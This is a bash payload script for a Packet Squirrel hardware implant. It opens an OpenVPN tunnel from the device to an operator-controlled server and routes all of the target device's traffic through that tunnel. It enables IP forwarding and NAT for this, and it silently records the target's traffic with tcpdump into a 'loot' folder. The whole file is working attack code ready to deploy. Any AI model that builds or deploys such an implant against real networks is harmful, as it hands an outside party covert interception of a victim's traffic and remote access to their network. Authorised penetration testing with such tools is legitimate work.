#!/bin/bash
# ================================================================
#  Packet Squirrel — openvpn-tunnel
#  Description : Establishes an OpenVPN tunnel from the Squirrel
#                to the operator's VPN server. All traffic from the
#                target device is routed through the tunnel, enabling
#                remote network access and traffic inspection.
#                The Squirrel acts as a transparent inline gateway.
#
#                Prerequisites on Squirrel:
#                  - openvpn package installed (opkg install openvpn)
#                  - VPN config at /root/payload/vpn/client.conf
#                  - client.conf includes ca, cert, key inline or
#                    references files in /root/payload/vpn/
#
#  Device      : Packet Squirrel (Mk I / Mk II, OpenWrt)
#  Author      : <operator>
#  Deploy      : Copy to /root/payload/payload.sh + vpn/ dir via SSH
# ================================================================

LED SETUP
sleep 5

LOG=/tmp/openvpn-squirrel.log
VPN_CONFIG=/root/payload/vpn/client.conf
IFACE_WAN=br-wan    # WAN side (toward router)
IFACE_LAN=eth0      # LAN side (toward target device)

if [ ! -f "$VPN_CONFIG" ]; then
    echo "[!] VPN config not found: $VPN_CONFIG" | tee -a "$LOG"
    LED FAIL
    exit 1
fi

echo "[*] Starting OpenVPN tunnel..." | tee -a "$LOG"
LED ATTACK

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start OpenVPN
openvpn --config "$VPN_CONFIG" \
    --log "$LOG" \
    --daemon \
    --writepid /tmp/openvpn.pid

# Wait for tun0 to come up (max 30s)
WAITED=0
while ! ip link show tun0 >/dev/null 2>&1; do
    sleep 2
    WAITED=$((WAITED + 2))
    if [ "$WAITED" -ge 30 ]; then
        echo "[!] OpenVPN tunnel failed to establish after 30s" | tee -a "$LOG"
        LED FAIL
        exit 1
    fi
done
echo "[+] tun0 is up" | tee -a "$LOG"

# Get VPN gateway IP (first hop)
VPN_GW=$(ip route | awk '/tun0/{print $3; exit}')
echo "[+] VPN gateway: $VPN_GW" | tee -a "$LOG"

# Route target traffic through VPN tunnel
# Remove default route, add VPN-tunneled default
ip route del default 2>/dev/null || true
ip route add default via "$VPN_GW" dev tun0

# NAT: masquerade LAN traffic through tunnel
iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE
iptables -A FORWARD -i "$IFACE_LAN" -o tun0 -j ACCEPT
iptables -A FORWARD -i tun0 -o "$IFACE_LAN" -m state --state RELATED,ESTABLISHED -j ACCEPT

echo "[+] NAT routing active: $IFACE_LAN → tun0" | tee -a "$LOG"

# Optional: silent capture of tunneled traffic
LOOT_DIR=/root/loot/vpn-$(date +%Y%m%d_%H%M%S)
mkdir -p "$LOOT_DIR"
tcpdump -i "$IFACE_LAN" -w "${LOOT_DIR}/target_traffic.pcap" \
    --buffer-size=2048 2>/dev/null &
TCPDUMP_PID=$!
echo "[*] Capturing target traffic to ${LOOT_DIR}/target_traffic.pcap" | tee -a "$LOG"

LED FINISH

cleanup() {
    kill "$TCPDUMP_PID" 2>/dev/null || true
    kill "$(cat /tmp/openvpn.pid 2>/dev/null)" 2>/dev/null || true
    iptables -t nat -D POSTROUTING -o tun0 -j MASQUERADE 2>/dev/null || true
    echo "[+] VPN tunnel stopped." | tee -a "$LOG"
}
trap cleanup EXIT INT TERM

wait "$TCPDUMP_PID"
